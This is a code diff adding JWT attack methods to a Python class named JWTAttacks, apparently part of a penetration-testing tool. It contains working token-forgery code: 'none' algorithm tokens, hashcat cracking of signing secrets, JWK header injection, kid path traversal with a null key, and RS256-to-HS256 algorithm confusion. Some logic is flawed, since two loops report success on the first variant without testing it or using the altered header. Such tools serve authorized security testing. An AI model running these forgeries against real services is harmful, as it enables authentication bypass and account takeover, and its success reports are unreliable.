@@ -357,6 +357,286 @@ class JWTAttacks:
         # Return all found JWTs
         return tokens
 
+    def unverified_signature_attack(self, token):
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(token)
+            payload = jwt.decode(token, options={"verify_signature": False})
+
+            # Create a new token with the same payload but no signature
+            modified_token = jwt.encode(payload, "", algorithm="none")
+
+            return {
+                "success": True,
+                "modified_token": modified_token,
+                "details": "Created unsigned token"
+            }
+        except Exception as e:
+            return {"error": f"Failed to perform unverified signature attack: {str(e)}"}
+
+    def none_signature_attack(self, token):
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(token)
+            payload = jwt.decode(token, options={"verify_signature": False})
+
+            # Try different variations of "none"
+            none_variations = ["none", "None", "NONE", "nOnE"]
+            success = False
+            successful_variation = None
+            modified_token = None
+
+            for variation in none_variations:
+                # Create a new header with the current variation
+                new_header = header.copy()
+                new_header["alg"] = variation
+
+                # Create a new token with the modified header
+                modified_token = jwt.encode(payload, "", algorithm="none")
+
+                # If we get here without error, this variation worked
+                success = True
+                successful_variation = variation
+                break
+
+            if success:
+                return {
+                    "success": True,
+                    "modified_token": modified_token,
+                    "details": f"Successfully created token with 'alg' set to '{successful_variation}'"
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": "All variations of 'none' algorithm failed"
+                }
+        except Exception as e:
+            return {"error": f"Failed to perform none signature attack: {str(e)}"}
+
+    def brute_force_secret(self, token):
+        try:
+            # Create a temporary file for the JWT
+            with open('temp_jwt.txt', 'w') as f:
+                f.write(token)
+
+            # Check if hashcat is installed
+            try:
+                subprocess.run(['hashcat', '--version'], capture_output=True, check=True)
+            except (subprocess.SubprocessError, FileNotFoundError):
+                return {"error": "hashcat is not installed. Please install hashcat to use this feature."}
+
+            # Check if jwt.secrets.list exists in jwt_secrets folder
+            secrets_path = 'jwt_secrets/jwt.secrets.list'
+            if not os.path.exists(secrets_path):
+                return {"error": f"Secrets file not found at {secrets_path}"}
+
+            # Run hashcat with proper formatting and wordlist
+            result = subprocess.run(
+                ['hashcat', '-a', '0', '-m', '16500', 'temp_jwt.txt', secrets_path],
+                capture_output=True,
+                text=True
+            )
+
+            # Clean up
+            try:
+                os.remove('temp_jwt.txt')
+            except:
+                pass
+
+            # Parse the output to find the secret
+            if result.stdout:
+                # Look for the JWT in the output
+                for line in result.stdout.split('\n'):
+                    if token in line:
+                        # The secret should be after the JWT
+                        parts = line.split(':')
+                        if len(parts) > 1:
+                            secret = parts[-1].strip()
+                            return {
+                                "success": True,
+                                "secret": secret,
+                                "details": f"Found secret key: {secret}"
+                            }
+                return {
+                    "success": False,
+                    "error": "No secret key found in the dictionary"
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": "Hashcat failed to find a match"
+                }
+        except Exception as e:
+            return {"error": f"Failed to perform brute force attack: {str(e)}"}
+
+    def jwk_header_injection(self, token):
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(token)
+            payload = jwt.decode(token, options={"verify_signature": False})
+
+            # Generate a new RSA key pair
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=2048,
+                backend=default_backend()
+            )
+
+            # Get the public key in JWK format
+            public_key = private_key.public_key()
+            public_numbers = public_key.public_numbers()
+
+            # Generate a random kid
+            kid = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8').rstrip('=')
+
+            # Create JWK with proper format
+            jwk = {
+                "kty": "RSA",
+                "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip('='),
+                "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip('='),
+                "kid": kid,
+                "alg": "RS256",
+                "use": "sig"
+            }
+
+            # Create a new clean header
+            new_header = {
+                "alg": "RS256",
+                "typ": "JWT",
+                "jwk": jwk
+            }
+
+            # Sign the token with the private key
+            modified_token = jwt.encode(
+                payload,
+                private_key,
+                algorithm='RS256',
+                headers=new_header
+            )
+
+            return {
+                "success": True,
+                "modified_token": modified_token,
+                "details": "Created token with injected JWK header and signed with generated RSA key"
+            }
+        except Exception as e:
+            return {"error": f"Failed to perform JWK header injection attack: {str(e)}"}
+
+    def kid_header_traversal(self, token):
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(token)
+            payload = jwt.decode(token, options={"verify_signature": False})
+
+            # Try different null device paths
+            null_paths = [
+                "../../../../../../../dev/null",  # Unix/Linux/macOS
+                "..\\..\\..\\..\\..\\..\\..\\NUL",  # Windows
+                "../../../../../../../dev/null/",  # With trailing slash
+                "..\\..\\..\\..\\..\\..\\..\\NUL\\"  # Windows with trailing slash
+            ]
+
+            success = False
+            successful_path = None
+            modified_token = None
+
+            for path in null_paths:
+                # Create a new header with the current path
+                new_header = header.copy()
+                new_header["kid"] = path
+
+                # Create a new token with the modified header and payload
+                # Using a null byte as the secret key (AA== in base64)
+                null_key = base64.b64decode("AA==")
+                modified_token = jwt.encode(
+                    payload,
+                    null_key,
+                    algorithm="HS256",
+                    headers=new_header
+                )
+
+                # If we get here without error, this path worked
+                success = True
+                successful_path = path
+                break
+
+            if success:
+                return {
+                    "success": True,
+                    "modified_token": modified_token,
+                    "details": f"Successfully created token with KID path traversal: {successful_path}"
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": "All KID path traversal attempts failed"
+                }
+        except Exception as e:
+            return {"error": f"Failed to perform KID header traversal attack: {str(e)}"}
+
+    def algorithm_confusion(self, token):
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(token)
+            payload = jwt.decode(token, options={"verify_signature": False})
+
+            # Get the public key from the token's header
+            if 'jwk' not in header:
+                return {"error": "No JWK found in token header"}
+
+            jwk = header['jwk']
+            if jwk['kty'] != 'RSA':
+                return {"error": "Only RSA keys are supported for this attack"}
+
+            # Get the raw n and e values from the JWK
+            n = base64.urlsafe_b64decode(jwk['n'] + '=' * (-len(jwk['n']) % 4))
+            e = base64.urlsafe_b64decode(jwk['e'] + '=' * (-len(jwk['e']) % 4))
+
+            # Create RSA public key from n and e
+            public_key = rsa.RSAPublicNumbers(
+                int.from_bytes(e, byteorder='big'),
+                int.from_bytes(n, byteorder='big')
+            ).public_key(default_backend())
+
+            # Convert to PEM format
+            pem = public_key.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+
+            # Base64 encode the PEM and remove newlines
+            pem_base64 = base64.b64encode(pem).decode('utf-8').replace('\n', '')
+
+            # Create the symmetric key JWK using the PEM-encoded key
+            symmetric_jwk = {
+                "kty": "oct",
+                "kid": jwk.get('kid', ''),
+                "k": pem_base64
+            }
+
+            # Create a new header with HS256 algorithm and the JWK
+            new_header = {
+                "alg": "HS256",
+                "typ": "JWT",
+                "jwk": symmetric_jwk
+            }
+
+            # Sign the token with the PEM-encoded key as the HMAC secret
+            modified_token = jwt.encode(
+                payload,
+                pem_base64,
+                algorithm='HS256',
+                headers=new_header
+            )
+
+            return {
+                "success": True,
+                "modified_token": modified_token,
+                "details": "Created token using algorithm confusion attack (RSA public key as HMAC secret)"
+            }
+        except Exception as e:
+            return {"error": f"Failed to perform algorithm confusion attack: {str(e)}"}
+
     def edit_jwt(self, decoded_text, use_secret=False, secret=''):
         try:
             # Split the decoded text into sections
